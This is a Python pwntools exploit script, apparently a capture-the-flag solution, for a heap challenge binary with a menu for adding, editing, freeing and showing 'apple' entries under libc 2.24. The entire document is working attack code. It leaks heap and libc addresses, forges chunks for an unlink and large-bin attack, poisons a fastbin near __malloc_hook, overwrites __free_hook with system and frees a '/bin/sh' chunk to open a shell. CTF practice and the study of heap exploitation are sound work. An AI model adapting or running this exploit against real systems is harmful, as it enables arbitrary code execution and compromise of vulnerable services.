from pwn import*
context.log_level ='DEBUG'
def new(size,content,sign=0):
	p.sendlineafter('your choice:','1')
	p.sendlineafter('color?(0:red, 1:green):','0')
	p.sendlineafter('value?(0-999):','0')
	p.sendlineafter('num?(0-16):','0')
	p.sendlineafter('description length?(1-1024):',str(size))
	if sign == 1:
		return
	p.sendafter('description of the apple:',content)
def free(index):
	p.sendlineafter('your choice:','2')
	p.sendlineafter('which?(0-15):',str(index))
def edit(index,content):
	p.sendlineafter('your choice:','3')
	p.sendlineafter('which?(0-15):',str(index))
	p.sendlineafter('color?(0:red, 1:green):','2')
	p.sendlineafter('value?(0-999):','1000')
	p.sendlineafter('num?(0-16):','17')
	p.sendafter('description of the apple:',content)
def show(index):
	p.sendlineafter('your choice:','4')
	p.sendlineafter('which?(0-15):',str(index))
p = process('./main')
libc = ELF('./libc-2.24.so',checksec=False)
new(0x3F0,'FMYY\n')
new(0xD8 ,'FMYY\n')
new(0x3F0,'FMYY\n')
new(0xD8 ,'FMYY\n')
free(2)
free(0)
new(0x400,'FMYY\n')
show(2)
p.recvuntil('description:')
heap_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x510
log.info('HEAP:\t' + hex(heap_base))
#clear all chunks
free(0)
free(3)
free(1)
free(0) #here I just want to free all chunks so that I can layout the new structure once again
#-------------------
unlink = heap_base + 0x28
P = heap_base + 0xB60

new(0x10,p64(P) + '\n')
new(0xD8,'FMYY\n')
new(0x3F0,'FMYY\n')
new(0xD8,'FMYY\n')
new(0x3E0,'FMYY\n')
new(0xD8,'FMYY\n')
new(0xD8,p64(0x411) + p64(unlink -0x18) + p64(unlink -0x10) + p64(0)*2 + '\n')
new(0x118,'FMYY\n')
new(0x60  ,'FMYY\n') #8
new(0x50  ,'FMYY\n') #9
new(0x70  ,'FMYY\n') #10
new(0x118,p64(0)*9 + p64(0x410) + p64(0x20) + p64(0)*2 + p64(0) + p64(0x21)  + '\n')
new(0x60,'FMYY\n')
free(0)
free(2)
free(4)
new(0x400,'FMYY\n')
edit(4,p64(P) + '\n')
free(11)
free(7)
new(0x3F0,'U'*24*8 + p32(0xDEADBEEF)*2 + '\n') #So far,we have get the fake_chunk ,and the index is 2
edit(4,p64(heap_base + 0x130) + '\n') #fix the large bins
new(0x118,'FMYY\n')
show(2)
p.recvuntil('\xEF\xBE\xAD\xDE'*2)
libc_base=u64(p.recv(6).ljust(8,'\x00')) -392 - 0x10 -libc.sym['__malloc_hook']
log.info('LIBC:\t' + hex(libc_base))
libc.address = libc_base
edit(2,'\x00'*24*8 + p64(0x141) + p64(392 + 0x10 + libc.sym['__malloc_hook'])*2+ '\n')
free(8)
free(9)
fake_fastbin = libc.sym['__malloc_hook'] + 0x10 + 0x30
payload = '\x00'*24*8 + p64(0x141) + p64(392 + 0x10 + libc.sym['__malloc_hook'])*2
payload += '\x00'*0x120
payload += p64(0) + p64(0x81) + p64(0x71) + p64(0)
payload += '\x00'*0x60
payload += p64(0) + p64(0x71) + p64(fake_fastbin) + '\n'
edit(2,payload)
new(0x60,'FMYY\n')
new(0x50,'FMYY\n')
new(0x50,p64(libc.sym['__free_hook'] -0xB58) + '\n')
free(7)
free(8)
new(0x300,'FMYY\n')
new(0x300,'FMYY\n')
new(0x300,'FMYY\n')
new(0x300,'FMYY\n')
new(0x300,'FMYY\n')
new(0x320,'\x00'*0x1D0 + p64(libc.sym['system']) + '\n')
payload = '\x00'*24*8 + p64(0x141)
payload += p64(392 + 0x10 + libc.sym['__malloc_hook'])*2+ '\x00'*0x120
payload += p64(0) + p64(0x81) + '\x00'*0x70
payload += p64(0) + p64(0x71) + '\x00'*0x60
payload += p64(0) + p64(0x91) + '/bin/sh\n'
edit(2,payload)
free(10)
p.interactive()

